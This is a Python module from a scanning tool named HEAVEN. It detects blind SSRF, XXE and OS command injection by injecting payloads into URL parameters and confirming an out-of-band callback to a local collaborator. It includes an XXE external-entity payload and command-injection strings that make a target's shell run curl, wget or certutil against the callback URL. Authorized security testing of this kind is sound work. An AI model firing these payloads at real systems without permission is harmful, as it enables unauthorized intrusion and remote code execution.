"""HEAVEN — out-of-band (OAST) prober for SSRF and XXE.

These two classes are *blind* by nature: a vulnerable server fetches a URL or
resolves an XML entity but rarely reflects the result, so timing/heuristic
detectors are noisy and unreliable. HEAVEN instead proves them: it hands the
target a URL pointing at its own in-house collaborator (:mod:`heaven.vulnscan.oast`)
and only reports a finding if the *target itself calls back*. That callback — a
real inbound HTTP request tagged with a per-probe token — is the evidence.

Because a finding requires an observed interaction, the false-positive rate is
effectively zero. The trade-off is reachability: the target must be able to reach
the collaborator, which holds for loopback/lab targets (the collaborator binds to
127.0.0.1 by default). For a remote target on another host, bind the collaborator
to a routable address you're authorized to receive callbacks on.
"""

from __future__ import annotations

import asyncio
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:  # pragma: no cover
    HAS_AIOHTTP = False

from heaven.utils.logger import get_logger
from heaven.vulnscan.oast import OASTListener

logger = get_logger("vulnscan.oob")

# Parameters that commonly drive a server-side fetch (SSRF sinks).
_SSRF_PARAMS = (
    "url", "uri", "u", "link", "src", "source", "dest", "destination", "path",
    "file", "document", "resource", "load", "fetch", "site", "domain", "host",
    "callback", "webhook", "feed", "image", "image_url", "imageurl", "img",
    "proxy", "redirect", "next", "target", "to", "out", "data", "reference", "ref",
)

_XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE heaven [<!ENTITY {name} SYSTEM "{cb}">]>'
    '<heaven><probe>&{name};</probe></heaven>'
)

# Parameters that commonly reach a shell (blind OS command injection sinks).
_CMDI_PARAMS = (
    "cmd", "exec", "command", "run", "ping", "host", "ip", "addr", "domain",
    "query", "search", "name", "file", "path", "target", "url", "dns", "lookup",
    "action", "func", "op", "data", "input", "arg", "args",
)

# Blind command-injection payloads. Each asks the target's shell to fetch the
# collaborator URL ({cb}); a callback proves OS command execution. ``{cb}`` is a
# plain http URL, so curl/wget/certutil all reach the in-house HTTP listener.
_CMDI_TEMPLATES = (
    ";curl {cb};",
    ";wget -q -O- {cb};",
    "|curl {cb}",
    "&&curl {cb}",
    "$(curl {cb})",
    "`curl {cb}`",
    "&curl {cb}",                              # Windows cmd chaining
    "&certutil -urlcache -f {cb} h.tmp",       # Windows LOLBin fetch
)

_DEFAULT_TIMEOUT = 8.0
_CALLBACK_WAIT = 3.0


def _finding(target: str, vuln_type: str, severity: str, title: str,
             description: str, confidence: float, evidence: dict) -> dict:
    return {
        "target": target,
        "vuln_type": vuln_type,
        "severity": severity,
        "title": title,
        "description": description,
        "confidence": confidence,
        "cve_id": "",
        "evidence": evidence,
        "source": "oob_scanner",
    }


def _evidence_for(oast: OASTListener, token: str) -> dict:
    hits = oast.interactions(token)
    first = hits[0] if hits else None
    return {
        "proof": "out-of-band callback received",
        "collaborator": oast.base_url,
        "token": token,
        "callback_count": len(hits),
        "callback_method": getattr(first, "method", ""),
        "callback_from": getattr(first, "client_ip", ""),
    }


async def _fire(session: "aiohttp.ClientSession", method: str, url: str,
                **kw) -> None:
    try:
        async with session.request(method, url, allow_redirects=False, **kw) as resp:
            await resp.read()
    except Exception as e:  # noqa: BLE001 - a failed probe is not a failed scan
        logger.debug("OOB probe %s %s failed: %s", method, url, e)


async def _wait_for_callbacks(oast: OASTListener, tokens: list[str],
                              timeout: float) -> None:
    """Give the target a bounded moment to call us back, off the event loop."""
    loop = asyncio.get_running_loop()

    def _poll() -> None:
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if any(oast.hit(t) for t in tokens):
                return
            time.sleep(0.05)

    await loop.run_in_executor(None, _poll)


async def _probe_ssrf(session: "aiohttp.ClientSession", url: str,
                      oast: OASTListener) -> list[dict]:
    parsed = urlparse(url)
    existing = parse_qsl(parsed.query, keep_blank_values=True)
    params = {k for k, _ in existing} | set(_SSRF_PARAMS)
    token_map: dict[str, str] = {}
    coros = []
    for param in params:
        token = oast.new_token()
        token_map[token] = param
        qs = [(k, v) for k, v in existing if k != param]
        qs.append((param, oast.url_for(token)))
        probe = urlunparse(parsed._replace(query=urlencode(qs)))
        coros.append(_fire(session, "GET", probe))
    await asyncio.gather(*coros, return_exceptions=True)
    await _wait_for_callbacks(oast, list(token_map), _CALLBACK_WAIT)

    findings: list[dict] = []
    for token, param in token_map.items():
        if oast.hit(token):
            findings.append(_finding(
                url, "ssrf", "high", f"Server-Side Request Forgery via '{param}'",
                "The server fetched an attacker-controlled URL — proven by an "
                "out-of-band callback from the target to HEAVEN's collaborator. "
                "SSRF can reach internal services and cloud metadata endpoints.",
                0.95, {**_evidence_for(oast, token), "parameter": param}))
    return findings


async def _probe_xxe(session: "aiohttp.ClientSession", url: str,
                     oast: OASTListener) -> list[dict]:
    token = oast.new_token()
    payload = _XXE_PAYLOAD.format(name="xxe", cb=oast.url_for(token))
    for ctype in ("application/xml", "text/xml"):
        await _fire(session, "POST", url, data=payload.encode(),
                    headers={"Content-Type": ctype})
    await _wait_for_callbacks(oast, [token], _CALLBACK_WAIT)
    if oast.hit(token):
        return [_finding(
            url, "xxe", "high", "XML External Entity (XXE) injection",
            "The endpoint parsed XML with external entities enabled — proven by "
            "an out-of-band callback when a SYSTEM entity resolved. XXE enables "
            "local file disclosure and SSRF.",
            0.95, _evidence_for(oast, token))]
    return []


async def _probe_cmdi(session: "aiohttp.ClientSession", url: str,
                      oast: OASTListener) -> list[dict]:
    """Blind OS command injection via out-of-band callback. Injects a shell
    command that fetches the collaborator into each candidate parameter; a
    callback proves code execution (definitionally zero false positive)."""
    parsed = urlparse(url)
    existing = parse_qsl(parsed.query, keep_blank_values=True)
    params = {k for k, _ in existing} | set(_CMDI_PARAMS)
    token_map: dict[str, str] = {}
    coros = []
    for param in params:
        token = oast.new_token()
        token_map[token] = param
        cb = oast.url_for(token)
        base_val = dict(existing).get(param, "1")
        for tpl in _CMDI_TEMPLATES:
            qs = [(k, v) for k, v in existing if k != param]
            qs.append((param, base_val + tpl.format(cb=cb)))
            probe = urlunparse(parsed._replace(query=urlencode(qs)))
            coros.append(_fire(session, "GET", probe))
    await asyncio.gather(*coros, return_exceptions=True)
    await _wait_for_callbacks(oast, list(token_map), _CALLBACK_WAIT)

    findings: list[dict] = []
    for token, param in token_map.items():
        if oast.hit(token):
            findings.append(_finding(
                url, "command_injection", "critical",
                f"Blind OS command injection via '{param}'",
                "The server executed an injected shell command — proven by an "
                "out-of-band callback from the target to HEAVEN's collaborator. "
                "This is remote code execution.",
                0.95, {**_evidence_for(oast, token), "parameter": param}))
    return findings


async def scan_oob(urls: list[str], oast: OASTListener | None = None,
                   timeout: float = _DEFAULT_TIMEOUT, max_urls: int = 25,
                   xxe: bool = True, cmdi: bool = True) -> dict:
    """Probe URLs for SSRF and XXE using an out-of-band collaborator.

    Pass an already-running :class:`OASTListener` (the orchestrator shares one);
    if none is given, a loopback collaborator is started for the duration.
    """
    if not HAS_AIOHTTP:
        return {"findings": [], "vulnerabilities": [], "total": 0,
                "error": "aiohttp not installed"}

    owns_listener = oast is None
    if oast is None:
        oast = OASTListener().start()

    # SSRF is keyed on unique scheme+host+path (query is rebuilt per-param).
    seen: set[str] = set()
    unique: list[str] = []
    for u in urls:
        key = u.split("?", 1)[0].split("#", 1)[0]
        if key in seen:
            continue
        seen.add(key)
        unique.append(u)
        if len(unique) >= max_urls:
            break

    findings: list[dict] = []
    try:
        conn = aiohttp.TCPConnector(ssl=False, limit=15)
        ct = aiohttp.ClientTimeout(total=timeout)
        headers = {"User-Agent": "Mozilla/5.0 (compatible; HEAVEN-OOB/1.0)"}
        async with aiohttp.ClientSession(connector=conn, timeout=ct,
                                         headers=headers) as session:
            sem = asyncio.Semaphore(6)

            async def _one(u: str) -> None:
                async with sem:
                    findings.extend(await _probe_ssrf(session, u, oast))
                    if xxe:
                        findings.extend(await _probe_xxe(session, u, oast))
                    if cmdi:
                        findings.extend(await _probe_cmdi(session, u, oast))

            await asyncio.gather(*[_one(u) for u in unique], return_exceptions=True)
    finally:
        if owns_listener:
            oast.stop()

    logger.info("OOB scan → %d finding(s) across %d URL(s)", len(findings), len(unique))
    return {"findings": findings, "vulnerabilities": findings, "total": len(findings)}
